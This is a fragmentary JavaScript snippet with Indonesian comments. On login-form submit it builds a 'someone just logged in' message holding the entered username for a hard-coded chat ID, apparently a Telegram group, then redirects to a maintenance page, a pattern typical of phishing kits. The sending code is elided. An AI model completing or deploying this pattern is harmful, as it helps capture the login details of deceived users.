document.addEventListener('DOMContentLoaded', () => {
    ...
    form.addEventListener('submit', (e) => {
        ...
        if (usernameValue) {
            ...
            const chatId = '-1002212055424'; // Ganti dengan ID chat Anda
            const feedbackText = `SESEORANG BARU SAJA MASUK

> ${usernameValue} has logged in.`;
            ...
            setTimeout(() => {
                window.location.href = 'maintenance.html'; // Ganti dengan nama file halaman maintenance jika perlu
            }, 2000);
        } else {
